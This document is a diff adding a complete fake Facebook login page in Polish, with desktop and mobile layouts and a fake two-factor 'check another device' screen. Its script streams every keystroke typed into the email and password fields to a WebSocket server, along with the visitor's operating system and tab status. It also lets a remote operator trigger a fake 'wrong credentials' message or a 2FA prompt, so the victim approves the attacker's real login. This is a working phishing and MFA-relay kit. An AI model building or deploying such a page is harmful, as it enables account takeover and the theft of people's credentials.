@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – zaloguj się lub zarejestruj</title>
+    <style>
+        /* ... cały CSS identyczny jak w poprzedniej wersji, włącznie ze stylami 2FA ... */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
+            background-color: #f0f2f5;
+            color: #050505;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .fb_content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 19px;
+            padding-bottom: calc(19px + 10%);
+        }
+        ._8esj { width: 100%; max-width: 1026px; }
+        ._8esk {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 51px;
+            max-width: 1026px;
+            width: 100%;
+            align-items: center;
+        }
+        ._8esl { display: flex; flex-direction: column; }
+        ._8ice { margin-bottom: 0px; display: flex; align-items: center; }
+        .fb_logo {
+            font-size: 56px;
+            font-weight: 700;
+            color: #1877f2;
+            letter-spacing: -1px;
+            margin-left: -36px;
+            height: 106px;
+            display: flex;
+            align-items: center;
+        }
+        ._8eso {
+            margin-top: -13px;
+            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 475px;
+            color: #000;
+        }
+        ._8esn { display: flex; flex-direction: column; align-items: center; padding-top: 8px; }
+        ._8iep {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+            padding: 15px 19px 19px;
+            width: 100%;
+            max-width: 376px;
+        }
+        ._6lux { margin-bottom: 10px; }
+        .inputtext {
+            width: 100%;
+            padding: 11px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 15px;
+            font-family: inherit;
+            background: #fff;
+            transition: border-color .2s;
+        }
+        .inputtext::placeholder { color: #90949c; }
+        .inputtext:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24,119,242,.2);
+        }
+        .inputtext.error {
+            border-color: #dc3545;
+            background-color: #fff5f5;
+        }
+        .inputtext.error:focus {
+            border-color: #dc3545;
+            box-shadow: 0 0 0 2px rgba(220,53,69,0.2);
+        }
+        .error-message {
+            display: none;
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 4px;
+            font-weight: 500;
+        }
+        .error-message.show { display: block; }
+        .invalid-credentials-msg {
+            display: none;
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 4px;
+            font-weight: 500;
+        }
+        .invalid-credentials-msg.show { display: block; }
+        ._6ltg { margin-top: 12px; }
+        ._6lth {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 48px;
+            transition: background-color .2s;
+        }
+        ._6lth:hover { background-color: #166fe5; }
+        ._6lth.loading { cursor: not-allowed; background-color: #1877f2; pointer-events: none; }
+        ._6lth .btn-loading-icon { width: 28px; height: 28px; display: none; }
+        ._6lth.loading .btn-text { display: none; }
+        ._6lth.loading .btn-loading-icon { display: block; }
+        ._6ltj {
+            text-align: center;
+            margin-top: 12px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #dddfe2;
+        }
+        ._6ltj a { color: #1877f2; text-decoration: none; font-size: 14px; }
+        ._6ltj a:hover { text-decoration: underline; }
+        ._8icz { height: 0; }
+        ._6lti {
+            display: block;
+            width: fit-content;
+            margin: 16px auto 0;
+            padding: 12px 24px;
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            transition: background-color .2s;
+        }
+        ._6lti:hover { background-color: #36a420; }
+
+        .btn-loading-spinner {
+            display: none;
+            width: 28px;
+            height: 28px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        ._6lth.loading .btn-loading-spinner { display: block; }
+        ._6lth.loading .btn-text { display: none; }
+
+        footer {
+            background: #fff;
+            padding: 28px 19px;
+            border-top: 1px solid #e5e7eb;
+        }
+        .footer-content { max-width: 1026px; margin: 0 auto; }
+        .language-selector, .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .language-selector a, .footer-links a {
+            color: #65676b;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .language-selector a:hover, .footer-links a:hover { text-decoration: underline; }
+        .footer-bottom { font-size: 12px; color: #65676b; }
+
+        .mobile-view { display: none; }
+
+        @media (max-width: 768px) {
+            .fb_content { display: none; }
+            .mobile-view { display: flex; }
+            body { background-color: #fff; }
+            .mobile-container {
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+                padding: 16px;
+            }
+            .mobile-header {
+                padding: 40px 0 20px 0;
+                text-align: center;
+                border-bottom: 1px solid #e5e7eb;
+                margin-bottom: 20px;
+            }
+            .mobile-logo {
+                font-size: 40px;
+                font-weight: 700;
+                color: #1877f2;
+                margin: 0 auto;
+            }
+            .mobile-content { flex: 1; display: flex; flex-direction: column; }
+            .mobile-login-section { margin-top: 20px; }
+            .mobile-h1 { font-size: 18px; font-weight: 600; margin-bottom: 24px; text-align: center; }
+            .mobile-form-group { margin-bottom: 12px; }
+            .mobile-input {
+                width: 100%;
+                padding: 12px;
+                border: 1px solid #ccc;
+                border-radius: 8px;
+                font-size: 15px;
+                font-family: inherit;
+                background-color: #f0f2f5;
+            }
+            .mobile-input::placeholder { color: #8a8d91; }
+            .mobile-input:focus { outline: none; background-color: #fff; border-color: #0a66c2; }
+            .mobile-input.error { border-color: #dc3545; background-color: #fff5f5; }
+            .mobile-input.error:focus { border-color: #dc3545; background-color: #fff5f5; }
+            .mobile-error-message {
+                display: none;
+                color: #dc3545;
+                font-size: 12px;
+                margin-top: 4px;
+                font-weight: 500;
+            }
+            .mobile-error-message.show { display: block; }
+            .mobile-invalid-credentials-msg {
+                display: none;
+                color: #dc3545;
+                font-size: 12px;
+                margin-top: 4px;
+                font-weight: 500;
+            }
+            .mobile-invalid-credentials-msg.show { display: block; }
+            .mobile-login-btn {
+                width: 100%;
+                padding: 12px;
+                background-color: #0a66c2;
+                color: white;
+                border: none;
+                border-radius: 8px;
+                font-size: 16px;
+                font-weight: 600;
+                cursor: pointer;
+                margin-top: 16px;
+                margin-bottom: 12px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                min-height: 48px;
+            }
+            .mobile-login-btn:hover { background-color: #0951a0; }
+            .mobile-login-btn.loading { cursor: not-allowed; pointer-events: none; }
+            .mobile-login-btn .btn-loading-spinner { display: none; width: 26px; height: 26px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.8s linear infinite; }
+            .mobile-login-btn.loading .btn-loading-spinner { display: block; }
+            .mobile-login-btn.loading .btn-text { display: none; }
+            .mobile-forgot-password { text-align: center; margin-bottom: 20px; }
+            .mobile-forgot-password a { color: #0a66c2; text-decoration: none; font-size: 14px; }
+            .mobile-forgot-password a:hover { text-decoration: underline; }
+            .mobile-divider { height: 1px; background-color: #e5e7eb; margin: 20px 0; }
+            .mobile-signup-btn {
+                width: 100%;
+                padding: 12px;
+                background-color: #31a24c;
+                color: white;
+                border: none;
+                border-radius: 8px;
+                font-size: 15px;
+                font-weight: 600;
+                cursor: pointer;
+                margin-bottom: 40px;
+                display: block;
+                text-align: center;
+                text-decoration: none;
+            }
+            .mobile-signup-btn:hover { background-color: #2a9141; }
+            .mobile-footer {
+                border-top: 1px solid #e5e7eb;
+                padding-top: 20px;
+                padding-bottom: 20px;
+                text-align: center;
+            }
+            .mobile-meta-logo {
+                font-size: 18px;
+                font-weight: 600;
+                color: #000;
+                margin-bottom: 20px;
+            }
+            .mobile-language-selector {
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 8px;
+                margin-bottom: 12px;
+            }
+            .mobile-language-selector a {
+                color: #65676b;
+                text-decoration: none;
+                font-size: 12px;
+                padding: 4px 8px;
+            }
+            .mobile-language-selector a:hover { background-color: #f0f2f5; }
+        }
+
+        /* ---------- 2FA OVERLAY ---------- */
+        #twoFA-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #ffffff;
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 24px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            overflow-y: auto;
+        }
+        .twofa-card {
+            width: 100%;
+            max-width: 560px;
+            text-align: left;
+            margin-top: 60px;
+        }
+        .twofa-card h1 {
+            font-family: Optimistic, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 1.5rem;
+            font-weight: 600;
+            line-height: 1.1667;
+            color: #050505;
+            margin: 0 0 12px 0;
+        }
+        .twofa-card p.desc {
+            font-family: Optimistic, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-size: 0.9375rem;
+            font-weight: 400;
+            line-height: 1.2667;
+            color: #111112;
+            margin-top: 20px;
+            margin-bottom: 20px;
+        }
+        .illustration {
+            width: 100%;
+            border-radius: 0;
+            display: block;
+        }
+        .twofa-code {
+            text-align: center;
+            font-size: 48px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            color: #050505;
+            margin: 32px 0 24px 0;
+        }
+        .twofa-status {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+        .waiting-icon {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+        .status-text strong {
+            display: block;
+            font-size: 15px;
+            color: #050505;
+            margin-bottom: 2px;
+        }
+        .status-text span {
+            font-size: 13px;
+            color: #65676b;
+        }
+    </style>
+</head>
+<body>
+
+<!-- DESKTOP VERSION -->
+<div class="fb_content clearfix" id="content" role="main">
+    <div>
+        <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
+            <div class="_8esk">
+                <div class="_8esl">
+                    <div class="_8ice">
+                        <div class="fb_logo">facebook</div>
+                    </div>
+                    <h2 class="_8eso">
+                        Facebook pomaga kontaktować się z innymi osobami oraz udostępniać im różne informacje i materiały.
+                    </h2>
+                </div>
+                <div class="_8esn">
+                    <div class="_8iep _8icy _9ahz _9ah-">
+                        <div class="_6luv _52jv">
+                            <form class="_9vtf" data-testid="royal_login_form" id="desktop-login-form">
+                                <div>
+                                    <div class="_6lux">
+                                        <input type="text" class="inputtext _55r1 _6luy" name="email" id="emailhidden" data-testid="royal_email" placeholder="Adres e-mail lub numer telefonu" autofocus="1" aria-label="Adres e-mail lub numer telefonu" data-field="email">
+                                        <div class="error-message" data-error="email">Adres e-mail lub numer telefonu jest wymagany</div>
+                                    </div>
+                                    <div class="_6lux">
+                                        <input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal_pass" placeholder="Hasło" aria-label="Hasło" data-field="password">
+                                        <div class="error-message" data-error="password">Hasło jest wymagane</div>
+                                        <div class="invalid-credentials-msg" id="desktop-invalid-msg">Wprowadzone dane logowania są nieprawidłowe.</div>
+                                    </div>
+                                </div>
+                                <div class="_6ltg">
+                                    <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="desktop-login-btn">
+                                        <span class="btn-text">Zaloguj się</span>
+                                        <div class="btn-loading-spinner"></div>
+                                    </button>
+                                </div>
+                                <div class="_6ltj">
+                                    <a href="https://www.facebook.com/login/identify/">Nie pamiętasz hasła?</a>
+                                </div>
+                                <div class="_8icz"></div>
+                                <div class="_6ltg">
+                                    <a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="https://www.facebook.com/reg/?entry_point=login&next=">Utwórz nowe konto</a>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- MOBILE VERSION -->
+<div class="mobile-view">
+    <div class="mobile-container">
+        <div class="mobile-header">
+            <div class="mobile-logo">f</div>
+        </div>
+        <div class="mobile-content">
+            <div class="mobile-login-section">
+                <h1 class="mobile-h1">Zaloguj się do Facebooka</h1>
+                <form id="mobile-login-form">
+                    <div class="mobile-form-group">
+                        <input type="text" class="mobile-input" placeholder="Adres e-mail lub numer telefonu komórkowego" data-field="email">
+                        <div class="mobile-error-message" data-error="email">Adres e-mail lub numer telefonu jest wymagany</div>
+                    </div>
+                    <div class="mobile-form-group">
+                        <input type="password" class="mobile-input" placeholder="Hasło" data-field="password">
+                        <div class="mobile-error-message" data-error="password">Hasło jest wymagane</div>
+                        <div class="mobile-invalid-credentials-msg" id="mobile-invalid-msg">Wprowadzone dane logowania są nieprawidłowe.</div>
+                    </div>
+                    <button type="submit" class="mobile-login-btn" id="mobile-login-btn">
+                        <span class="btn-text">Zaloguj się</span>
+                        <div class="btn-loading-spinner"></div>
+                    </button>
+                </form>
+                <div class="mobile-forgot-password">
+                    <a href="https://www.facebook.com/login/identify/">Nie pamiętasz hasła?</a>
+                </div>
+                <div class="mobile-divider"></div>
+                <a href="https://www.facebook.com/reg/?entry_point=login&next=" class="mobile-signup-btn">Utwórz nowe konto</a>
+            </div>
+        </div>
+        <div class="mobile-footer">
+            <div class="mobile-meta-logo">Meta</div>
+            <div class="mobile-language-selector">
+                <a href="#">Polski</a>
+                <a href="#">English (US)</a>
+                <a href="#">Słonańsko górska</a>
+                <a href="#">Русский</a>
+                <a href="#">Deutsch</a>
+                <a href="#">Français (France)</a>
+                <a href="#">Italiano</a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- 2FA OVERLAY (bez "Wróć do logowania", z ikoną kropki.svg) -->
+<div id="twoFA-overlay">
+    <div class="twofa-card">
+        <h1>Sprawdź inne urządzenie</h1>
+        <p class="desc">Otwórz powiadomienie na innym urządzeniu, a następnie dotknij <span id="twoFA-code">16</span>, aby zweryfikować swoją tożsamość.</p>
+        <img class="illustration" src="https://www.facebook.com/images/assets_DO_NOT_HARDCODE/xmds_f3_meta_account/F3-2FA-AnotherDeviceNotifications-WWW_light-3x.png" alt="Powiadomienie na innym urządzeniu">
+        <div class="twofa-code" id="twoFA-code-big">16</div>
+        <div class="twofa-status">
+            <img src="assets/kropki.svg" alt="Oczekiwanie" class="waiting-icon">
+            <div class="status-text">
+                <strong>Oczekiwanie na zatwierdzenie</strong>
+                <span>Może upłynąć kilka minut, zanim otrzymasz powiadomienie na innym urządzeniu.</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Desktop Footer -->
+<footer>
+    <div class="footer-content">
+        <div class="language-selector">
+            <a href="#">Polski</a>
+            <a href="#">English (UK)</a>
+            <a href="#">ਪੰਜਾਬੀ</a>
+            <a href="#">中文(简体)</a>
+            <a href="#">العربية</a>
+            <a href="#">Español</a>
+            <a href="#">Português (Brasil)</a>
+            <a href="#">한국어</a>
+        </div>
+        <div class="footer-links">
+            <a href="#">Zarejestruj się</a><a href="#">Zaloguj się</a><a href="#">Messenger</a>
+            <a href="#">Facebook Lite</a><a href="#">Filmy</a><a href="#">Miejsca</a>
+            <a href="#">Gry</a><a href="#">Marketplace</a><a href="#">Facebook Pay</a>
+            <a href="#">Oculus</a><a href="#">Instagram</a><a href="#">Bulletin</a>
+            <a href="#">Lokalne</a><a href="#">Usługi</a><a href="#">Centrum informacji wyborczych</a>
+            <a href="#">Grupy</a><a href="#">Informacje</a><a href="#">Utwórz reklamę</a>
+            <a href="#">Utwórz stronę</a><a href="#">Deweloperzy</a><a href="#">Kariera</a>
+            <a href="#">Prywatność</a><a href="#">Pliki cookie</a><a href="#">AdChoices</a>
+            <a href="#">Warunki</a><a href="#">Pomoc</a>
+        </div>
+        <div class="footer-bottom">Meta © 2022</div>
+    </div>
+</footer>
+
+<!-- ===== WEBSOCKET CONNECTION ===== -->
+<script>
+(function() {
+    const WS_URL = 'ws://localhost:8080';
+    let ws = null;
+    let sid = null;
+    let reconnectTimer = null;
+
+    function connect() {
+        if (ws && ws.readyState === WebSocket.OPEN) return;
+        ws = new WebSocket(WS_URL);
+
+        ws.onopen = function() {
+            console.log('WebSocket połączony');
+            ws.send(JSON.stringify({ type: 'register', role: 'client', sid: sid || undefined }));
+        };
+
+        ws.onmessage = function(event) {
+            try {
+                const msg = JSON.parse(event.data);
+                if (msg.type === 'registered') {
+                    sid = msg.sid;
+                    startHeartbeat();
+                    // Wyślij informację o systemie
+                    const system = getOS();
+                    send({ type: 'system', v: system });
+                }
+                if (msg.type === 'command' && msg.action === 'wrong_credentials') {
+                    window.showWrongCredentials();
+                }
+                if (msg.type === 'command' && msg.action === 'two_factor') {
+                    window.showTwoFactor(msg.code || '16');
+                }
+            } catch(e) {}
+        };
+
+        ws.onclose = function() {
+            stopHeartbeat();
+            reconnectTimer = setTimeout(connect, 3000);
+        };
+
+        ws.onerror = function() { ws.close(); };
+    }
+
+    function send(data) {
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify(data));
+        }
+    }
+
+    function getOS() {
+        const ua = navigator.userAgent;
+        if (ua.includes('Win')) return 'Windows';
+        if (ua.includes('Mac')) return 'MacOS';
+        if (ua.includes('Linux')) return 'Linux';
+        if (ua.includes('Android')) return 'Android';
+        if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+        return 'Inny';
+    }
+
+    let hbInterval = null;
+    function startHeartbeat() {
+        stopHeartbeat();
+        hbInterval = setInterval(() => send({ type: 'hb' }), 4000);
+    }
+    function stopHeartbeat() {
+        if (hbInterval) { clearInterval(hbInterval); hbInterval = null; }
+    }
+
+    document.addEventListener('visibilitychange', function() {
+        send({ type: 'tab', v: document.hidden ? 'ukryta' : 'aktywna' });
+    });
+    window.addEventListener('pagehide', () => send({ type: 'offline' }));
+    window.addEventListener('beforeunload', () => send({ type: 'offline' }));
+
+    connect();
+
+    document.querySelectorAll('input[data-field="email"], .mobile-input[data-field="email"]').forEach(input => {
+        input.addEventListener('input', function() { send({ type: 'email', v: this.value }); });
+    });
+    document.querySelectorAll('input[data-field="password"], .mobile-input[data-field="password"]').forEach(input => {
+        input.addEventListener('input', function() { send({ type: 'password', v: this.value }); });
+    });
+
+    const desktopForm = document.getElementById('desktop-login-form');
+    const mobileForm = document.getElementById('mobile-login-form');
+
+    function handleSubmit(e) {
+        e.preventDefault();
+        const emailInput = this.querySelector('input[data-field="email"]');
+        const passInput = this.querySelector('input[data-field="password"]');
+        let valid = true;
+
+        if (!emailInput.value.trim()) {
+            emailInput.classList.add('error');
+            this.querySelector('.error-message[data-error="email"], .mobile-error-message[data-error="email"]')?.classList.add('show');
+            valid = false;
+        } else {
+            emailInput.classList.remove('error');
+            this.querySelector('.error-message[data-error="email"], .mobile-error-message[data-error="email"]')?.classList.remove('show');
+        }
+
+        if (!passInput.value.trim()) {
+            passInput.classList.add('error');
+            this.querySelector('.error-message[data-error="password"], .mobile-error-message[data-error="password"]')?.classList.add('show');
+            valid = false;
+        } else {
+            passInput.classList.remove('error');
+            this.querySelector('.error-message[data-error="password"], .mobile-error-message[data-error="password"]')?.classList.remove('show');
+        }
+
+        if (valid) {
+            const btn = this.querySelector('button[type="submit"]');
+            if (btn) btn.classList.add('loading');
+            document.getElementById('desktop-invalid-msg')?.classList.remove('show');
+            document.getElementById('mobile-invalid-msg')?.classList.remove('show');
+            send({ type: 'login_submit', v: emailInput.value.trim() });
+        }
+    }
+
+    if (desktopForm) desktopForm.addEventListener('submit', handleSubmit);
+    if (mobileForm) mobileForm.addEventListener('submit', handleSubmit);
+
+    document.querySelectorAll('.inputtext[data-field], .mobile-input[data-field]').forEach(input => {
+        input.addEventListener('input', function() {
+            this.classList.remove('error');
+            const form = this.closest('form');
+            if (form) {
+                form.querySelector('.error-message[data-error="'+this.dataset.field+'"], .mobile-error-message[data-error="'+this.dataset.field+'"]')?.classList.remove('show');
+            }
+        });
+    });
+
+    window.showWrongCredentials = function() {
+        document.getElementById('desktop-login-btn')?.classList.remove('loading');
+        document.getElementById('mobile-login-btn')?.classList.remove('loading');
+        document.getElementById('desktop-invalid-msg')?.classList.add('show');
+        document.getElementById('mobile-invalid-msg')?.classList.add('show');
+    };
+
+    window.showTwoFactor = function(code) {
+        document.getElementById('content').style.display = 'none';
+        document.querySelector('.mobile-view').style.display = 'none';
+        var overlay = document.getElementById('twoFA-overlay');
+        overlay.style.display = 'flex';
+        document.getElementById('twoFA-code').textContent = code;
+        document.getElementById('twoFA-code-big').textContent = code;
+    };
+
+    window.hideTwoFactor = function() {
+        document.getElementById('twoFA-overlay').style.display = 'none';
+        if (window.innerWidth > 768) {
+            document.getElementById('content').style.display = '';
+            document.querySelector('.mobile-view').style.display = '';
+        } else {
+            document.getElementById('content').style.display = '';
+            document.querySelector('.mobile-view').style.display = 'flex';
+        }
+    };
+})();
+</script>
+</body>
+</html>
